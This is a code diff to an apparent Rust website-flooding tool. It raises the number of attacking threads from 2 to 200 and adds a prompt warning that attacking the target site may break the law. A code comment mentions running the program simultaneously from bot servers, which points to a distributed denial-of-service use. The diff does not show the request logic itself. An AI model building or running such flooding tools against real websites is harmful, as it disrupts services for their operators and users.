@@ -11,9 +11,9 @@ use regex::Regex;
 // XXX: remotely call bot servers and execute this program simultaneously
 
 fn main() {
-    //let handles = (0..200)
-    get_url();
-    let handles = (0..2)
+    read_line(get_url());
+
+    let handles = (0..200)
         .into_iter()
         .map(|x| {
             thread::spawn(move || {
@@ -25,6 +25,23 @@ fn main() {
     for thread in handles {
         thread.join().unwrap();
     }
+}
+
+fn read_line(url: String) -> String {
+    use std::io::{stdin,stdout,Write};
+    let mut s = String::new();
+    print!("\n[Warning!] attacking the website '{}' can offend the law of your country. \n\nAre you still okay to keep on doing this? [Y/n]: ", &url);
+    let _ = stdout().flush();
+    stdin().read_line(&mut s).expect("Did not enter a correct string");
+
+    if let Some('\n')=s.chars().next_back() {
+        s.pop();
+    }
+
+    if let Some('\r')=s.chars().next_back() {
+        s.pop();
+    }
+    return s;
 }
 
 fn get_url() -> String {
